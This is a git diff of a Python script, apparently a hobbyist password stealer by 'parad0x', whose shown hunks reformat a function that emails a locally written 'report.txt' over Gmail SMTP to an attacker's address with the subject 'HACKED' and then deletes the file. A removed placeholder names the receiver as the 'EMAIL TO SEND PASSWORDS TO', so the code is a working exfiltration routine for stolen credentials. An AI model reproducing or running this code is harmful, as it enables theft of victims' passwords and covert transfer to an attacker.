@@ -1,4 +1,4 @@
-// made by parad0x
+// madeby parad0x 20/10/19 8:48pm
 
 #imports
 import os
@@ -59,41 +59,43 @@ def get_bytes():
         fp.write(string)
 
 def send_stuff():
-  # our email contents
-  mail_content = 'Haha you got hacked lol'
+    # our email contents
+    mail_content = 'Haha you got hacked lol'
 
-  #email 
-  sender_address = 'YOUR EMAIL'
-  sender_pass = 'YOUR PASSWORD'
-  receiver_address = 'EMAIL TO SEND PASSWORDS TO'
+    #email 
+    sender_address = 'SENDER ADDRESS'
+    sender_pass = 'SENDER PASS'
+    receiver_address = 'RECEIVER ADDRESS'
 
-  #setup mime
-  message = MIMEMultipart()
-  message['From'] = sender_address
-  message['To'] = receiver_address
-  message['Subject'] = 'HACKED'
-  message.attach(MIMEText(mail_content, 'plain'))
-  attach_file_name = 'report.txt'
-  attach_file = open('report.txt', 'r') # opens the file in read mode
-  payload = MIMEBase('application', 'octate-stream')
-  payload.set_payload((attach_file).read())
-  encoders.encode_base64(payload) # encodes the attachment
-  # add payload header
-  payload.add_header('Content-Discomposition', 'attachment: filename= '+attach_file_name)
-  message.attach(payload)
+    #setup mime
+    message = MIMEMultipart()
+    message['From'] = sender_address
+    message['To'] = receiver_address
+    message['Subject'] = 'HACKED'
+    message.attach(MIMEText(mail_content, 'plain'))
+    attach_file_name = 'report.txt'
+    attach_file = open('report.txt', 'r') # opens the file in read mode
+    payload = MIMEBase('application', 'octate-stream')
+    payload.set_payload((attach_file).read())
+    encoders.encode_base64(payload) # encodes the attachment
+    # add payload header
+    payload.add_header('Content-Discomposition', 'attachment: filename= '+attach_file_name)
+    message.attach(payload)
 
-  #smtp session (sending it)
-  session = smtplib.SMTP('smtp.gmail.com', 587)
-  session.starttls()
-  session.login(sender_address, sender_pass)
-  text = message.as_string()
-  session.sendmail(sender_address, receiver_address, text)
-  session.quit()
+    #smtp session (sending it)
+    session = smtplib.SMTP('smtp.gmail.com', 587)
+    session.starttls()
+    session.login(sender_address, sender_pass)
+    text = message.as_string()
+    session.sendmail(sender_address, receiver_address, text)
+    session.quit()
 
-  print("Data sent to " + receiver_address + "!!")
+    print("Data sent to " + receiver_address + "!!")
+
+
 
 if __name__ == '__main__':
-  get_bytes()
-  send_stuff()
+	get_bytes()
+	send_stuff()
 
-  os.remove('report.txt')
+os.remove('report.txt')
